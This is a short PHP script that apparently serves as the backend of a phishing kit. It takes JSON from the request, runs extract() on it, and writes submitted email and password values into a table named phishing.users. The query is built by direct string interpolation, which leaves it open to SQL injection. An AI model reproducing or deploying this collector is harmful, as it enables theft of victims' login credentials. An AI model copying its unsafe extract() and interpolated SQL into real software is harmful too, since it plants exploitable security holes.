<?php
include './headers.php';
require_once './global_variables.php';
require_once './global_sql_functions.php';
require_once './global_functions.php';

$data = json_decode(file_get_contents("php://input"), true);
extract($data);
$query = "INSERT INTO phishing.users(mail, pass) VALUES ('$mail', '$pass')";
$result = paternalia_query(1, $query);
